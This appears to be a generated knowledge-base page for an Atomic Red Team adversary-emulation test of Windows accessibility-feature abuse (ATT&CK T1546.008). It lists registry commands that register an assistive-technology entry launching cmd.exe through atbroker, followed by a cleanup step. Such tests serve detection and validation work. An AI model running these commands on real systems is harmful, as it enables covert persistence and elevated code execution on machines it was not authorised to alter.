---
atomic_guid: "444ff124-4c83-4e28-8df6-6efd3ece6bd4"
title: "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "444ff124-4c83-4e28-8df6-6efd3ece6bd4"
  - "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Atbroker.exe (AT) Executes Arbitrary Command via Registry Key

Executes code specified in the registry for a new AT (Assistive Technologies).

## Metadata

- Atomic GUID: 444ff124-4c83-4e28-8df6-6efd3ece6bd4
- Technique: T1546.008: Event Triggered Execution: Accessibility Features
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.008/T1546.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.008]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
atbroker /start malware_test
```

### Cleanup

```commandprompt
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
